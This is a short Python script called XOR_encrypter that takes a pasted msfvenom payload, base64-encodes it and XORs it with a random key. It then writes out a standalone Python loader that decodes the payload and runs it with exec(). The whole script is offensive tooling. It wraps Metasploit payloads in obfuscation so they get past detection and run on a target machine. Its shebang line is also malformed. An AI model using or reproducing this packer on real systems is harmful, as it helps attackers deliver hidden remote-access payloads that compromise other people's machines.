#!/bin/bash/python3

import secrets
import base64

# [1] Enter the payload:
print("Welcome to XOR_encrypter!")
print("[NOTE]: In msfvenom please use the format 'python-reflection'.\n")
payload = input("Paste your msfvenom payload here:\n> ")

# [2] Encode the python to bytes object:
byte_payload = bytes(payload, 'utf-8')

# [3] Encode in base64 the bytes object payload:
b64_payload = base64.b64encode(byte_payload)

# [4] Create a key that the same size as the base64 encoded payload:
b64_payload_length = len(b64_payload)           # [4.1] Check the length of b64_payload.
KEY = secrets.token_bytes(b64_payload_length)   # [4.2] Create an hex key with the same length of b64_payload.

# [5] XOR the b64-encoded payload with the Key:
ENCODED_PAYLOAD = bytes([a ^ b for a, b in zip(b64_payload, KEY)])

# print("------------------------------------------")
# print(f"[YOUR ENCODED PAYLOAD]\n{ENCODED_PAYLOAD}\n")
# print("------------------------------------------")
# print(f"[YOUR KEY]\n{KEY}\n")

# [6] Create the payload file:
payload_code = f"""
import base64

pld = {ENCODED_PAYLOAD}

key = {KEY}

XOR_operation = bytes([a ^ b for a, b in zip(pld, key)])

final_payload = base64.b64decode(XOR_operation).decode('utf-8')

exec(final_payload)
"""
payload_name = input("The payload is almost ready, how do you wish to call it?\n> ")
with open(payload_name, "w") as f:
    f.write(payload_code)

print(f"Your payload is ready!\nThank you for using XOR_encrypter!")